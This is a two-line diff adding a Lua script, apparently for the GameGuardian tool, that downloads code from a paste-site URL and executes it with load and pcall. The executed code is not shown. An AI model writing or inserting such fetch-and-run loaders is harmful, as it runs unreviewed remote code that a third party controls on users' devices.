@@ -1,0 +1,2 @@
+V = load(gg.makeRequest("https://paste.tc/raw/script-780").content)
+pcall(V)
